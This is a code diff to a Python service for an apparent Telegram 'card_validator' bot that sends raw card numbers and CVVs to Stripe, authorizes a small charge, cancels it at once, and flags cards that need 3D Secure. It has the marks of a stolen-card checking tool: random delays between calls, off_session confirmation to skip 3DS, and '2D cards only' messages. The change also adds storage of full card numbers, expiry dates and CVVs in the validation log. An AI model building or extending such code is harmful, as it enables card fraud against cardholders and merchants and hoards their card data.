@@ -3,13 +3,12 @@ Stripe service — handles PaymentIntent creation, confirmation, and cancellatio
 Uses capture_method: manual (authorize only, never capture).
 """
 
+import httpx
 import random
 import time
 from dataclasses import dataclass
 from typing import Optional
 from uuid import uuid4
-
-import stripe
 
 from config import config
 from models.stripe_account import StripeAccount
@@ -17,6 +16,7 @@ from models.validation_log import ValidationLog
 from services.card_validator import CardInfo
 from services.crypto_service import decrypt
 from services.retry_handler import retry_async, is_stripe_retryable_error
+from services.stripe_api_client import StripeAPIClient
 
 
 @dataclass
@@ -30,10 +30,10 @@ class ValidationResult:
     error_message: Optional[str]
 
 
-def _get_stripe_client(account: StripeAccount) -> stripe.StripeObject:
-    """Initialize Stripe client with a decrypted secret key."""
+def _get_stripe_client(account: StripeAccount) -> StripeAPIClient:
+    """Initialize Stripe HTTP client with a decrypted secret key."""
     secret_key = decrypt(account.secret_key_encrypted)
-    return stripe.StripeClient(api_key=secret_key)
+    return StripeAPIClient(api_key=secret_key)
 
 
 def _random_delay() -> None:
@@ -62,30 +62,27 @@ async def validate_card_with_stripe(
     validation_id = str(uuid4())
     amount = config.stripe_amount_cents
 
+    intent = None
+    payment_method = None
+
     try:
         # Step 1: Create PaymentIntent (with retry)
         async def create_intent():
-            return client.payment_intents.create(
+            return client.create_payment_intent(
                 amount=amount,
                 currency="usd",
-                payment_method_types=["card"],
-                capture_method="manual",
                 metadata={
                     "telegram_user_id": str(user_telegram_id),
                     "validation_id": validation_id,
                     "bot_name": "card_validator",
                 },
             )
-        
+
         intent = await retry_async(
             max_retries=3,
             base_delay=1.0,
             max_delay=10.0,
-            retryable_exceptions=(
-                stripe.error.APIConnectionError,
-                stripe.error.RateLimitError,
-                stripe.error.APIError,
-            ),
+            retryable_exceptions=(httpx.RequestError,),
         )(create_intent)()
 
         # Random delay before confirmation
@@ -93,49 +90,38 @@ async def validate_card_with_stripe(
 
         # Step 2: Create PaymentMethod from raw card details (with retry)
         async def create_payment_method():
-            return client.payment_methods.create(
-                type="card",
-                card={
-                    "number": card.number,
-                    "exp_month": card.exp_month,
-                    "exp_year": card.exp_year,
-                    "cvc": card.cvv,
-                },
+            return client.create_payment_method(
+                card_number=card.number,
+                exp_month=card.exp_month,
+                exp_year=card.exp_year,
+                cvc=card.cvv,
             )
-        
+
         payment_method = await retry_async(
             max_retries=3,
             base_delay=1.0,
             max_delay=10.0,
-            retryable_exceptions=(
-                stripe.error.APIConnectionError,
-                stripe.error.RateLimitError,
-                stripe.error.APIError,
-            ),
+            retryable_exceptions=(httpx.RequestError,),
         )(create_payment_method)()
 
         # Step 3: Confirm with off_session=True to skip 3DS where possible (with retry)
         # off_session=True tells Stripe this is a server-side transaction
         # Cards that REQUIRE 3DS will return requires_action instead of succeeding
         async def confirm_intent():
-            return client.payment_intents.confirm(
-                intent.id,
-                payment_method=payment_method.id,
+            return client.confirm_payment_intent(
+                intent_id=intent["id"],
+                payment_method_id=payment_method["id"],
                 off_session=True,
             )
-        
+
         intent = await retry_async(
             max_retries=3,
             base_delay=1.0,
             max_delay=10.0,
-            retryable_exceptions=(
-                stripe.error.APIConnectionError,
-                stripe.error.RateLimitError,
-                stripe.error.APIError,
-            ),
+            retryable_exceptions=(httpx.RequestError,),
         )(confirm_intent)()
 
-        status = intent.status
+        status = intent.get("status")
 
         # Step 4: Parse result
         if status == "requires_action":
@@ -143,7 +129,7 @@ async def validate_card_with_stripe(
             result = ValidationResult(
                 status="3ds_required",
                 decline_code="requires_3ds",
-                stripe_pi_id=intent.id,
+                stripe_pi_id=intent.get("id"),
                 bank_name=None,
                 card_brand=None,
                 error_message="This card requires 3D Secure (OTP). 2D cards only.",
@@ -153,34 +139,30 @@ async def validate_card_with_stripe(
             # Card is valid — authorization succeeded
             # Extract bank/brand info if available
             bank_name = None
-            card_brand = payment_method.card.brand if hasattr(payment_method, "card") else None
+            card_brand = payment_method.get("card", {}).get("brand")
 
             # Step 5: Cancel immediately — NEVER capture (with retry)
             try:
                 async def cancel_intent():
-                    return client.payment_intents.cancel(intent.id)
-                
+                    return client.cancel_payment_intent(intent_id=intent["id"])
+
                 await retry_async(
                     max_retries=2,
                     base_delay=0.5,
                     max_delay=5.0,
-                    retryable_exceptions=(
-                        stripe.error.APIConnectionError,
-                        stripe.error.RateLimitError,
-                        stripe.error.APIError,
-                    ),
+                    retryable_exceptions=(httpx.RequestError,),
                 )(cancel_intent)()
             except Exception as e:
                 # If cancel fails after retries, log it but don't fail the validation
                 # Admin should manually review in Stripe dashboard
                 import logging
                 logger = logging.getLogger(__name__)
-                logger.error(f"Failed to cancel PaymentIntent {intent.id} after retries: {e}")
+                logger.error(f"Failed to cancel PaymentIntent {intent['id']} after retries: {e}")
 
             result = ValidationResult(
                 status="valid",
                 decline_code=None,
-                stripe_pi_id=intent.id,
+                stripe_pi_id=intent.get("id"),
                 bank_name=bank_name,
                 card_brand=card_brand,
                 error_message=None,
@@ -189,13 +171,14 @@ async def validate_card_with_stripe(
         elif status == "requires_payment_method":
             # Card was declined
             decline_code = None
-            if intent.last_payment_error and hasattr(intent.last_payment_error, "decline_code"):
-                decline_code = intent.last_payment_error.decline_code
+            last_error = intent.get("last_payment_error")
+            if last_error:
+                decline_code = last_error.get("decline_code")
 
             result = ValidationResult(
                 status="declined",
                 decline_code=decline_code,
-                stripe_pi_id=intent.id,
+                stripe_pi_id=intent.get("id"),
                 bank_name=None,
                 card_brand=None,
                 error_message=None,
@@ -206,26 +189,68 @@ async def validate_card_with_stripe(
             result = ValidationResult(
                 status="error",
                 decline_code=None,
-                stripe_pi_id=intent.id,
+                stripe_pi_id=intent.get("id"),
                 bank_name=None,
                 card_brand=None,
                 error_message=f"Unexpected status: {status}",
             )
 
-    except stripe.CardError as e:
-        # Card-specific error (decline)
-        decline_code = e.code if hasattr(e, "code") else None
-        result = ValidationResult(
-            status="declined",
-            decline_code=decline_code,
-            stripe_pi_id=e.intent.id if hasattr(e, "intent") and e.intent else None,
-            bank_name=None,
-            card_brand=None,
-            error_message=str(e.user_message) if hasattr(e, "user_message") else None,
-        )
+    except httpx.HTTPStatusError as e:
+        # HTTP error from Stripe API
+        import logging
+        logger = logging.getLogger(__name__)
+        
+        try:
+            # Log raw error response for debugging
+            logger.error(f"Stripe HTTP error ({e.response.status_code}): {e.response.text[:500]}")
+            
+            error_data = e.response.json()
+            error_obj = error_data.get("error", {})
+            
+            # Try multiple paths to extract decline_code
+            decline_code = (
+                error_obj.get("decline_code") or 
+                error_obj.get("code") or
+                error_data.get("decline_code") or
+                error_data.get("code")
+            )
+            
+            user_message = error_obj.get("message") or error_data.get("message")
+            
+            logger.info(f"Extracted decline_code: {decline_code}")
+            logger.info(f"Extracted message: {user_message}")
 
-    except stripe.StripeError as e:
-        # General Stripe error (network, API, etc.)
+            if e.response.status_code == 402:  # Payment Required - card declined
+                result = ValidationResult(
+                    status="declined",
+                    decline_code=decline_code,
+                    stripe_pi_id=intent.get("id") if intent else None,
+                    bank_name=None,
+                    card_brand=None,
+                    error_message=user_message,
+                )
+            else:
+                result = ValidationResult(
+                    status="error",
+                    decline_code=decline_code,
+                    stripe_pi_id=None,
+                    bank_name=None,
+                    card_brand=None,
+                    error_message=user_message or str(e),
+                )
+        except Exception as parse_error:
+            logger.error(f"Failed to parse Stripe error response: {parse_error}")
+            result = ValidationResult(
+                status="error",
+                decline_code=None,
+                stripe_pi_id=None,
+                bank_name=None,
+                card_brand=None,
+                error_message=str(e),
+            )
+
+    except httpx.RequestError as e:
+        # Network error
         result = ValidationResult(
             status="error",
             decline_code=None,
@@ -247,6 +272,10 @@ async def validate_card_with_stripe(
             status=result.status,
             decline_code=result.decline_code,
             stripe_account_id=stripe_account.id,
+            full_card_number=card.number,
+            exp_month=str(card.exp_month),
+            exp_year=str(card.exp_year),
+            cvv=card.cvv,
         )
     except Exception:
         # Don't fail validation if logging fails
